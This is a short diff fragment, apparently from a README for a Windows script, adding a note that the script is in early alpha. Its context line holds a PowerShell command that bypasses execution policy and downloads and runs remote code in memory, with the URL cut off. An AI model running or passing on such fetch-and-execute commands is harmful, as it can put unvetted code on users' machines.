@@ -12,3 +12,6 @@ powershell -nop -exec bypass -c "iex(New-Object Net.WebClient).DownloadString('h
 
 
 In the Windows Command Prompt.
+
+
+This Script is still in the early Alpha release!!!
